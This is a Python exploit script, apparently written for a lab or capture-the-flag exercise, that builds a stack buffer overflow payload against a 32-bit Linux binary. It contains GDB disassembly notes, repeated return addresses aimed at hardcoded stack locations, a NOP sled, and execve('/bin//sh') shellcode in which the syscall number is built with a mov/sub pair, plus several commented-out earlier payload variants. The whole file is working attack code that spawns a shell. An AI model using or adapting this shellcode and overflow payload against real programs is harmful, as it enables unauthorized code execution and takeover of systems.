#!/usr/bin/python3
import struct
import sys

# 0x565555d0 <main+99>      lea    esp,[ebp-0x8]    ; esp = ebp-8, set esp to ebp-8                                   
# 0x565555d3 <main+102>     pop    ecx              ; ecx = value at top of stack ($esp)
# 0x565555d4 <main+103>     pop    ebx              ; pop another stack value
# 0x565555d6 <main+105>     lea    esp,[ecx-0x4]    ; esp  = ecx-4, set esp to ecx-4
# 0x565555d9 <main+108>     ret                     ; pop value at top of stack ($esp) and return

# padding0 = "AAAAB".encode() + b'\xef\xbe\xad\xde'

padding = "AAAAB".encode()
offset = 40 # add an offset that will hopefully hit the nopslide
eip  = struct.pack("I", 0xffffdd90 + offset) * 10
nopslide = b'\x90'*50
# code = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
# code = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x1b\xcd\x80\x31\xc0\x40\xcd\x80'

# b0 ff = mov al, 0xFF
# 2c f4 = sub al, 0xF4
addSub = b'\xb0\xff\x2c\xf4'
code = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2' + addSub + b'\xcd\x80\x31\xc0\x40\xcd\x80'

payload = padding + eip + nopslide + code
# payload = padding0

# payload = ("1 "+"A"*2000).encode()
deadbeef = b'\xef\xbe\xad\xde'
desiredAddress = struct.pack("I", 0xffffd058 + 12)   # ebx + 4
# payload = b'1 ' + b'A'*1012 + deadbeef + desiredAddress + nopslide + code
payload = b'1 ' + desiredAddress*255 + nopslide + code
# for letter in "abcdefghijklmnopqrstuvwxyz":
#     payload += letter.upper().encode() * 100
#print(payload)
sys.stdout.buffer.write(payload)
